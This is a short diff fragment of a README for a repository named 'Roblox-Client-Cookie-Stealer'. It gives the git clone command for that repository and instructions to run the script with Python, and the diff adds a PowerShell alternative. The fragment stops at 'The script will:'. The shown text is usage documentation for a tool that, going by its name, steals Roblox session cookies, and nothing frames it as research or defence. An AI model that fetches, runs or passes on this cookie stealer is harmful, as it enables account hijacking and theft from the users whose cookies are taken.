@@ -36,6 +36,8 @@ git clone https://github.com/Ramona-Flower/Roblox-Client-Cookie-Stealer.git
 - Ensure you have Python 3 installed. Then, navigate to the project directory and run the script:
 ```
 python main.py
+or
+powershell ./main.ps1
 ```
 
 The script will:
